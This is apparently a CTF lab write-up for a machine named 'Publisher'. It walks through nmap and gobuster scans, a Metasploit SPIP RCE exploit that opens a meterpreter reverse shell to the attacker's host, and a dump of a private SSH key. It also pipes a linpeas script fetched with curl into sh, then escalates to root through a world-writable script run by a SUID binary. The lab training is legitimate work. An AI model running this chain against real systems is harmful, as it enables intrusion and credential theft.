# Publisher
## IP: 10.10.218.82

## Quick nmap scan 

```ruby
 Nmap 7.94SVN scan initiated Tue May 13 17:20:50 2025 as: nmap -sC -sV -vv -Pn -oN scan.txt 10.10.218.82
Nmap scan report for 10.10.218.82
Host is up, received user-set (0.33s latency).
Scanned at 2025-05-13 17:20:50 IST for 20s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 13 17:21:10 2025 -- 1 IP address (1 host up) scanned in 20.11 seconds

```

# Network Reconnaissance Report

## Scan Details
- **Target**: 10.10.218.82
- **Scan Type**: Comprehensive Service Detection
- **Date**: May 13, 2025 17:20:50 IST
- **Tool**: Nmap 7.94SVN
- **Parameters**: `-sC` (default scripts), `-sV` (version detection), `-vv` (verbose), `-Pn` (no ping)
- **Duration**: 20 seconds

## Host Status
- **State**: Up (0.33s latency)
- **Operating System**: Linux (Ubuntu) - Determined through service banners

## Open Ports Analysis

### 22/tcp - SSH Service
- **Service**: OpenSSH 8.2p1 Ubuntu 4ubuntu0.10
- **Key Fingerprints**:
  - RSA: `3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04`
  - ECDSA: `256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94`
  - ED25519: `256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb`
- **Security Notes**:
  - Current OpenSSH version shows no immediate critical vulnerabilities
  - Key exchange algorithms appear standard and secure

### 80/tcp - HTTP Service
- **Service**: Apache httpd 2.4.41 (Ubuntu)
- **Web Server Header**: Apache/2.4.41 (Ubuntu)
- **Page Title**: "Publisher's Pulse: SPIP Insights & Tips"
- **Supported Methods**: GET, POST, OPTIONS, HEAD
- **Technology Stack**:
  - SPIP CMS detected (from web content)
  - Standard Apache configuration

## Security Assessment
1. **Initial Attack Surface**:
   - Web application (SPIP CMS) presents primary attack vector
   - SSH service appears properly configured with modern encryption

2. **Vulnerability Considerations**:
   - SPIP CMS versions often have known RCE vulnerabilities
   - Apache 2.4.41 has several patched CVEs that should be verified

3. **Recommended Next Steps**:
   - Web application penetration testing
   - SPIP version verification for known exploits
   - HTTP method testing (particularly POST/OPTIONS)

## Full Command
```bash
nmap -sC -sV -vv -Pn -oN scan.txt 10.10.218.82
```

## Risk Evaluation
- **Overall Risk Level**: Medium
- **Critical Findings**: None immediate
- **Potential Vulnerabilities**: Web application framework
```


## Dirfuzzing

```ruby
gobuster dir -u http://10.10.218.82/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.218.82/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://10.10.218.82/images/]
/.htm                 (Status: 403) [Size: 277]
/.                    (Status: 200) [Size: 8686]
/.htaccess            (Status: 403) [Size: 277]
/.phtml               (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
/.html_var_DE         (Status: 403) [Size: 277]
/spip                 (Status: 301) [Size: 311] [--> http://10.10.218.82/spip/]
/server-status        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.html.               (Status: 403) [Size: 277]
/.html.html           (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htm.                (Status: 403) [Size: 277]
/.htmll               (Status: 403) [Size: 277]
/.phps                (Status: 403) [Size: 277]
/.html.old            (Status: 403) [Size: 277]
Progress: 12506 / 63088 (19.82%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 12506 / 63088 (19.82%)

```

## Vulnerability Identification

During reconnaissance, I identified SPIP CMS version 4.2.0 running on the target system. Research revealed this version is vulnerable to authenticated remote code execution (CVE-2023-27372).
Metasploit Exploitation

I utilized Metasploit Framework to execute the attack:

```ruby
[msf](Jobs:0 Agents:0) >> search spip

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_connect_exec             2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .
   12  exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
   13    \_ target: PHP In-Memory                       .                .          .      .
   14    \_ target: Unix/Linux Command Shell            .                .          .      .
   15    \_ target: Windows Command Shell               .                .          .      .


Interact with a module by name or index. For example info 15, use 15 or use exploit/multi/http/spip_rce_form
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'

[msf](Jobs:0 Agents:0) >> use 12
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> options
.
.
.
[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> set lhost 10.8.127.26
lhost => 10.8.127.26
[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> options

Module options (exploit/multi/http/spip_rce_form):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                         sing-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.127.26      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> set rhosts 10.10.218.82
rhosts => 10.10.218.82
[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> run
[*] Started reverse TCP handler on 10.8.127.26:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Unable to determine the version of SPIP "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> set target
set target     set targeturi  
[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> set targeturi /spip/
targeturi => /spip/
[msf](Jobs:0 Agents:0) exploit(multi/http/spip_rce_form) >> run
[*] Started reverse TCP handler on 10.8.127.26:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] The target appears to be vulnerable. The detected SPIP version (4.2.0) is vulnerable.
[*] Got anti-csrf token: AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[*] 10.10.218.82:80 - Attempting to exploit...
[*] Sending stage (40004 bytes) to 10.10.218.82
[*] Meterpreter session 1 opened (10.8.127.26:4444 -> 10.10.218.82:50394) at 2025-05-13 17:39:45 +0530

(Meterpreter 1)(/home/think/spip/spip) > 
(Meterpreter 1)(/home/think/spip) > cd ..
(Meterpreter 1)(/home/think) > ls
Listing: /home/think
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-05-13 17:19:28 +0530  .bash_history
100644/rw-r--r--  220   fil   2023-11-14 14:27:26 +0530  .bash_logout
100644/rw-r--r--  3771  fil   2023-11-14 14:27:26 +0530  .bashrc
040700/rwx------  4096  dir   2023-11-14 14:27:24 +0530  .cache
040700/rwx------  4096  dir   2023-12-08 18:37:22 +0530  .config
040700/rwx------  4096  dir   2024-02-11 02:52:33 +0530  .gnupg
040775/rwxrwxr-x  4096  dir   2024-01-10 18:16:09 +0530  .local
100644/rw-r--r--  807   fil   2023-11-14 14:27:24 +0530  .profile
020666/rw-rw-rw-  0     cha   2025-05-13 17:19:28 +0530  .python_history
040755/rwxr-xr-x  4096  dir   2024-01-10 18:24:17 +0530  .ssh
020666/rw-rw-rw-  0     cha   2025-05-13 17:19:28 +0530  .viminfo
040750/rwxr-x---  4096  dir   2023-12-21 00:35:25 +0530  spip
100644/rw-r--r--  35    fil   2024-02-11 02:50:39 +0530  user.txt

(Meterpreter 1)(/home/think) > cd ..s
[-] stdapi_fs_chdir: Operation failed: 1
(Meterpreter 1)(/home/think) > cd .ssh
(Meterpreter 1)(/home/think/.ssh) > ls
Listing: /home/think/.ssh
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  569   fil   2024-01-10 18:24:17 +0530  authorized_keys
100644/rw-r--r--  2602  fil   2024-01-10 18:18:14 +0530  id_rsa
100644/rw-r--r--  569   fil   2024-01-10 18:18:14 +0530  id_rsa.pub

(Meterpreter 1)(/home/think/.ssh) > cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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(  MODIFY  )Ec1WrKvHvWND0WuthNYTThiwFr
LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5
M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96
Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
-----END OPENSSH PRIVATE KEY-----
(Meterpreter 1)(/home/think/.ssh) > 

```
and i got the shell. and I got the pvt ssh key. I got into it

```
ssh think@10.10.218.82 -i key 
The authenticity of host '10.10.218.82 (10.10.218.82)' can't be established.
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.218.82' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 13 May 2025 12:18:07 PM UTC

  System load:                      0.15
  Usage of /:                       75.8% of 9.75GB
  Memory usage:                     15%
  Swap usage:                       0%
  Processes:                        133
  Users logged in:                  0
  IPv4 address for br-72fdb218889f: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.218.82


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 20:24:07 2024 from 192.168.1.13
think@publisher:~$ cat user.txt
**********************

```

and I got the user flag


### time to get the root access

I just ran the linpeas.sh

```ruby
curl -L http://10.8.127.26:8000/linpeas.sh | sh

══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 467K Dec 18  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 15K Dec 13  2023 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SUID binary!)

```

I got Unknown SUID binary

```bash
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SUID binary!)
think@publisher:/tmp$ strings /usr/sbin/run_container | head -n 20
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
think@publisher:/tmp$ 

```

It's looks like an link in it

```
/opt/run_container.sh

hink@publisher:/tmp$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```

* everyone can write the file


**Command Breakdown:**

1. `cd /dev/shm/`
   - Changes directory to `/dev/shm` (shared memory temporary filesystem)
   - This location is often used for:
     - Inter-process communication
     - Temporary file storage
     - Testing privilege escalation vectors

2. `ls`
   - Verifies the directory is empty (no files present)

3. `cp /bin/bash .`
   - Copies the system's Bash binary to the current directory
   - Purpose: Create a local copy of Bash that can be manipulated or executed with different permissions

4. `./bash -p`
   - Executes the local Bash copy with the `-p` (privileged) flag
   - The `-p` flag attempts to:
     - Preserve effective user/group IDs
     - Maintain elevated privileges if the binary has SUID/SGID bits set

**Technical Significance:**
- This is a common privilege escalation testing technique
- If the Bash binary had SUID permissions (which it doesn't by default), this could potentially maintain root privileges
- In this case, since it's just a regular copy of Bash, the `-p` flag won't grant additional privileges
- The attempt was likely made to test if any privilege escalation was possible through Bash

**Security Implications:**
- Demonstrates proper security controls on the system:
  - Default Bash permissions prevent this simple escalation method
  - No unexpected SUID binaries in `/dev/shm`
- Shows the attacker's methodology of testing common escalation vectors


```bash
hink@publisher:/tmp$ cd /dev/shm/
think@publisher:/dev/shm$ ls
think@publisher:/dev/shm$ cp /bin/bash .
think@publisher:/dev/shm$ ls
bash
think@publisher:/dev/shm$ ./bash -p
think@publisher:/dev/shm$ vim /opt/run_container.sh
#!/bin/bash

cat /root/root.txt
# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
	docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2) 	if [ $(docker ps -q | wc -l) -lt 2 ]; then
	            echo "No enough containers are currently running."
    	            exit 1
		fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
think@publisher:/dev/shm$ run_container 
3a4225cc9e85709adda6ef55d6a4f2ca  
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours

Enter the ID of the container or leave blank to create a new one: ^C

```
I added `cat /root/root.txt`
on the file . once I ececutei, the I got the flag

```
think@publisher:/dev/shm$ run_container 
3a4225cc9e85709adda6ef******4f2ca  
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours

Enter the ID of the container or leave blank to create a new one: ^C
think@publisher:/dev/shm$ 

```
# Conclusion

### The attack path involved:

*   Web directory enumeration revealing vulnerable SPIP CMS

*   Exploitation of SPIP CMS vulnerability for initial access

*   Discovery of misconfigured SUID binary leading to root access
